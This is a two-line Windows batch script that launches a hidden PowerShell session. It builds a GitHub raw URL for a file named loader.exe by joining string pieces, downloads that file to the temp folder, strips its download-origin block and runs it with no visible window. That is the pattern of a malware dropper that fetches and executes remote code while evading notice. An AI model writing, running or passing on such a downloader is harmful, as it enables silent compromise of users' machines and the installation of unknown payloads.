@echo off
powershell -NoP -NonI -W Hidden -Command "$u='ht'+'tps://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/loader.exe';$p='%TEMP%\l.exe';(New-Object Net.WebClient).DownloadFile($u,$p);Unblock-File $p;Start-Process $p -WindowStyle Hidden"
